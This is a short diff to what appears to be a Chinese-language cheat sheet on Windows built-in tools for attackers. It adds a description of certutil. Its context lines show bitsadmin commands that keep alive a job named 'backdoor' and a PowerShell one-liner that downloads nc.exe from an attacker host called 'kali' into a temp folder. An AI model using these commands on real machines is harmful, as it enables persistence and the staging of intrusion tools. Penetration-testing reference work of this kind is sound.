@@ -104,6 +104,10 @@ bitsadmin /Setminretrydelay backdoor 1
 bitsadmin /resume backdoor
 ```
 
+### certutil
+
+certutil 是Windows命令行工具，用于管理证书服务和证书相关的操作。证书服务是Windows操作系统中的一个角色，用于创建和管理证书，以及为用户和计算机分发证书。
+
 ### schtasks
 
 schtasks 是Windows操作系统中用来创建、删除、查询、更改和运行系统任务计划的命令行工具。任务计划可以用来定时运行脚本或程序，执行系统维护任务，或者自动执行重复的作业。
@@ -186,5 +190,3 @@ download file
 ```powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kali/binaries/nc.exe','c:\windows\temp\nc.exe')"
 ```
-
-### wiresahrk
